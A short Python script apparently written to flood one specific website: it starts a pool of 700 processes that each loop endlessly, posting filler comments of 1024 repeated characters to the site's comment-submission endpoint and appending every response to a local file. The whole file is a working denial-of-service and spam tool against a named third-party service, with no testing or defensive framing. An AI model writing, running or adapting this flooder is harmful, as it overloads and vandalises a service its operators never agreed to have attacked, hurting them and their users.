import multiprocessing
import requests

def fuck(_):
    while True:
        params = {
            'id': '1',
        }
        data = {
            'uid': 'A',
            'group_name': 'A',
            'name': 'A',
            'remark': 'A',
            'contents': 'A' * (1024),
        }
        try:
            response = requests.post('http://www.okmou.com/comments/add', params=params, data=data)
            with open('result.txt', 'a+') as f:
                f.write(response.text + '\n')
        except Exception as e:
            print("error", e)


if __name__ == "__main__":
    with multiprocessing.Pool(700) as p:
        p.map(fuck, range(0, 10000))